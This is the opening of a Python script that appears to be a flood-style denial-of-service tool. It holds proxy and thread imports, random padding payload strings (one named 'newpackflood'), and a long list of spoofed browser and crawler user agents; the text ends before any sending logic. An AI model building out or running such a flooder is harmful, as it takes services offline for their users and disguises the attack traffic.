#!/usr/bin/python

import os
import re
import time
import sys
import random
import math
import getopt
import socks
import string
import terminal
import threading
import ssl
import urllib


from threading import Thread

global stop_now
global term

stop_now = False

randomint=random.randint(1,32250)
randomint2=randomint*random.randint(1,3)
randomletter=random.choice(string.letters)
finaloutput=randomletter*randomint2
finaloutput2=randomletter*randomint2
finaloutput3=randomletter*randomint2
newpackflood= randomletter*randomint*2

useragents = [
"AppleWebKit/534.48.3 (KHTML, like Gecko) Version/5.1 Safari/534.48.3",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) "
"AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:5.0.1) "
"Gecko/20100101 Firefox/5.0.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) "
"AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30",
"Opera/9.80 (Macintosh; Intel Mac OS X 10.7.0; U; Edition MacAppStore; en) "
"Presto/2.9.168 Version/11.50",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2)"
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",
"Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)",
"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/5.7.4 (Fedora015; U; AMD_PhenX6 Linux Kernal 2.6.35.2; en-UK) DevKit/534.7 (Gecko) Chrome/7.0.517.44 GoogleR/9.47.1[BlackPanda]",
"Mozilla/5.0 (Windows NT 5.1; rv:2.0b6pre) Gecko/20100902 Firefox/4.0b6pre Fennec/2.0b1pre"
"Mozilla/5.0 (X11; Linux armv7l; rv:2.0b4pre) Gecko/20100818 Firefox/4.0b4pre Fennec/2.0a1pre"
"Mozilla/5.0 (X11; Linux armv7l; rv:2.0b4pre) Gecko/20100812 Firefox/4.0b4pre Fennec/2.0a1pre"
"Mozilla/5.0 (X11; Linux armv7l; rv:2.0b3pre) Gecko/20100730 Firefox/4.0b3pre Fennec/2.0a1pre"
"Mozilla/5.0 (X11; Linux armv71; en-US; rv:2.0b2pre) Gecko/20100722 Firefox/4.0b2pre Fennec/2.0a1pre"
"Mozilla/5.0 (X11; Linux armv71; rv:2.0b4pre) Gecko/20100818 Firefox/4.0b4pre Fennec/2.0a1pre"
"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Fennec/2.0.1"
"Mozilla/5.0 (X11; U; Linux armv7l; pl-PL; rv:1.9.2.5) Gecko/20100614 Firefox/3.6.5pre Fennec/1.1"
"Mozilla/5.0 (X11; U; Linux armv7l; en-US; rv:1.9.2a1pre) Gecko/20090322 Fennec/1.0b2pre"
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.1.17) Gecko/20080829 Mozilla/5.0 (X11; U; Linux armv7l; en-US; rv:1.9.2a1pre) Gecko/20090322 Fennec/1.0b2pre"
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.2a1pre) Gecko/20090626 Fennec/1.0b2"
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2a1pre) Gecko/20090317 Fennec/1.0b1"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2a1pre) Gecko/20090317 Fennec/1.0b1"
"Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.1b2pre) Gecko/20081116 Fennec/1.0a2pre"
"Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081116 Fennec/1.0a2pre"
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2a1pre) Gecko/20081222 Fennec/1.0a2"
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1b4pre) Gecko/20090401 Fennec/1.0a2"
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1b3pre) Gecko/20090106 Fennec/1.0a2"
"Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.2a1pre) Gecko/20081222 Fennec/1.0a2"
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2a1pre) Gecko/20081222 Fennec/1.0a2"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2a1pre) Gecko/20081222 Fennec/1.0a2"
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1"
"Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1"
"Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1"
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1"
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1"
"Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.1b1pre) Gecko/20081005220218 Gecko/2008052201 Fennec/0.9pre"
"Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.1b1pre) Gecko/20080923171103 Fennec/0.8"
"Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.1a2pre) Gecko/20080820121708 Fennec/0.7"
"Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.1a1pre) Gecko/2008071707 Fennec/0.5"
"Mozilla/5.0 (Windows; U; Windows CE 5.2; en-US; rv:1.9.2a1pre) Gecko/20090210 Fennec/0.11"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
"Googlebot/2.1 (http://www.googlebot.com/bot.html)",
"Opera/9.20 (Windows NT 6.0; U; en)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
"Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
"Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)", # maybe not
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
"Googlebot/2.1 (http://www.googlebot.com/bot.html)",
"Opera/9.20 (Windows NT 6.0; U; en)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
"Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
"Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)", # maybe not
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)"
"Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET) ",
"Googlebot/2.1 (http://www.googlebot.com/bot.html)",
"Opera/9.20 (Windows NT 6.0; U; en)",
"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
"Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16)",
"Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)", 
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13)",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.97 Safari/537.22 Perk/3.3.0.0)",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",
"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51)",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1.12) Gecko/20080201Firefox/2.0.0.12",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7) "
"AppleWebKit/534.48.3 (KHTML, like Gecko) Version/5.1 Safari/534.48.3",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) "
"AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:5.0.1) "
"Mozilla/4.0 (compatible; Cerberian Drtrs Version-3.2-Build-0)",
"Mozilla/4.0 (compatible; AvantGo 6.0; FreeBSD)",
"Gigabot/2.0; http://www.gigablast.com/spider.html",
"Mozilla/5.0 (X11; U; Linux i686; tr-TR; rv:1.9.2.12) Gecko/20101028 Pardus/2009 Firefox/3.6.12",
"Mozilla/4.0 (compatible; MyFamilyBot/1.0; http://www.myfamilyinc.com)",
"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; DTS Agent",
"IRLbot/2.0 (compatible; MSIE 6.0; http://irl.cs.tamu.edu/crawler)",
"Wget/1.10.2 ",
"Lynx/2.8.6dev.15 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7d",
"Wget/1.9.1 ",
"Baiduspider+(+http://www.baidu.com/search/spider_jp.html)",
"Baiduspider+(+http://www.baidu.com/search/spider.htm)",
"Mozilla/5.0 (compatible; BecomeBot/3.0; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)",
"Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)",
"Mozilla/5.0 (compatible; BeslistBot; nl; BeslistBot 1.0;  http://www.beslist.nl/",
"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)",
"zspider/0.9-dev http://feedback.redkolibri.com/",
"Mozilla/4.0 compatible ZyBorg/1.0 DLC (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
"Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
"Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)",
"Mozilla/4.0 compatible ZyBorg/1.0 (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
"Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)",
"Mozilla/4.0 compatible ZyBorg/1.0 (wn-14.zyborg@looksmart.net; http://www.WISEnutbot.com)",
"Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )",
"Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://sp.ask.com/docs/about/tech_crawling.html)",
"Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)",
"Mozilla/2.0 (compatible; Ask Jeeves/Teoma)",
"TerrawizBot/1.0 (+http://www.terrawiz.com/bot.html)",
"TheSuBot/0.2 (www.thesubot.de)",
"TheSuBot/0.1 (www.thesubot.de)",
"FAST-WebCrawler/3.8 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
"FAST-WebCrawler/3.7/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)",
"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
"FAST-WebCrawler/3.6/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)",
"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
"FAST-WebCrawler/3.x Multimedia",
"Mozilla/4.0 (compatible: FDSE robot)",
"findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable",
"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable",
"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2",
"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)",
"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)",
"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)",
"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)",
"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)",
"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)",
"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)",
"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)",
"MojeekBot/0.2 (archi; http://www.mojeek.com/bot.html)",
"Moreoverbot/5.1 ( http://w.moreover.com; webmaster@moreover.com) Mozilla/5.0",
"Moreoverbot/5.00 (+http://www.moreover.com; webmaster@moreover.com)",
"msnbot/1.0 (+http://search.msn.com/msnbot.htm)",
"msnbot/0.9 (+http://search.msn.com/msnbot.htm)",
"msnbot/0.11 ( http://search.msn.com/msnbot.htm)",
"MSNBOT/0.1 (http://search.msn.com/msnbot.htm)",
"Mozilla/5.0 (Linux; Android 4.4.4; Nexus 5 Build/KTU84Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.1.2; en-au; GT-I9305T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 4.2.2; my-mm; GT-M6a Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; Android 4.4.2; ASUS_T00F Build/KVT49L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.141 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; I9192 Build/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; Android 4.2.2; GT-P5100 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.3; SM-G7102 Build/JLS36C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.2.2; Galaxy S4 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; en-us; SM-N900A Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.4; XT1097 Build/KXE21.187-45) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.117 Mobile",
"Mozilla/5.0 (Linux; Android 4.4.4; XT1097 Build/KXE21.187-30.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile",
"Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Lenovo A369i Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; Android 4.3; D2305 Build/18.0.A.1.30) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.4.2; en-gb; LG-D802 Build/KOT49I.D80220c) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.2.2; vi-vn; mobiistar touch BEAN 402c Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; XT1080 Build/SU4.21) AppleWebKit/537.16 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.16",
"Mozilla/5.0 (Linux; U; Android 4.3; en-ca; HUAWEI G6-L11 Build/HuaweiG6-L11) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; Android 4.1.2; LG-F160L Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.1.1; en-gb; SonyC1505 Build/11.3.A.2.23) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 4.2.2; th-th; HUAWEI Y511-U30 Build/HUAWEIY511-U30) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Series40; Nokia2700c/09.98; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27",
"Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2194.2 Safari/537.36",
"Mozilla/5.0 (X11; Linux i686; rv:6.0.2) (Q7sip7ZS4Ba8FkDSOvRNleYM4KEG59V8+uT/RC1tW0U=) Gecko/20100101 Firefox/6.0.2",
"Mozilla/5.0 (Windows NT 6.2; ARM; Trident/7.0; Touch; rv:11.0; WPDesktop; NOKIA; Lumia 925; ANZ892) like Gecko",
"Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 925; ANZ892) like Gecko",
"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64; ; CJPMS_AAPCA4157828C9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.14 Safari/537.17",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2194.2 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0 FirePHP/0.7.4",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
"Mozilla/5.0 (iPad; CPU OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/38.0.2125.59 Mobile/12A365 Safari/600.1.4",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.99 Safari/537.22",
"Mozilla/5.0 (iPod touch; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B411 Safari/600.1.4",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.7 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36 OPR/25.0.1614.50",
"Mozilla/5.0 (X11; CrOS x86_64 6158.64.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.108 Safari/537.36",
"Guzzle/4.2.3 curl/7.35.0 PHP/5.5.9-1ubuntu4.4",
"curl/7.30.0",
"Mozilla/5.0 (Linux ia32) node.js/0.10.32 v8/3.14.5.9",
"Mozilla/5.0 (compatible; Googlebot/4.1; en-US rv:9.3.7) Firefox/32.5",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7)",
"AppleWebKit/534.48.3 (KHTML, like Gecko) Version/5.1 Safari/534.48.3",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us)",
"AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:5.0.1)",
"Gecko/20100101 Firefox/5.0.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) ",
"AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30",
"Opera/9.80 (Macintosh; Intel Mac OS X 10.7.0; U; Edition MacAppStore; en)",
"Presto/2.9.168 Version/11.50",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2)",
"Baiduspider+(+http://www.baidu.com/search/spider.htm)",
"Mozilla/5.0 (compatible; BecomeBot/3.0; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)",
